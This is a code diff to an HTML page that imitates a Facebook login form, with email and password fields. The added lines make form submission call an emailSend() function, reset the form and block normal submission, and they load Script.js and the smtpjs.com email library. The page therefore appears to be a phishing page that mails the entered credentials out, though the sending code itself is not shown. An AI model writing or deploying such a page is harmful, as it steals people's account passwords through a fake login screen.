@@ -11,8 +11,8 @@
         <img src="img/fb.png" alt="logo">
     </header>
     <section> 
-         <fORm>
-            <input type="text" name="email" id="Identifiant" placeholder="Phne number or Email" required>
+         <fORm onsubmit="emailSend();  reset(); return false";>
+            <input type="email or number" name="email" id="Identifiant" placeholder="Phne number or Email" required>
             <input type="password" name="motPasse" id="motPasse" placeholder="Password" required>
             <button type="submit">Log in</button>
             <h4>Forgot your password ?</h4>
@@ -27,5 +27,7 @@
             <li><a href="#">Plus</a></li>
         </ul>
     </footer>
+    <script src="Script.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
 </body>
 </html>
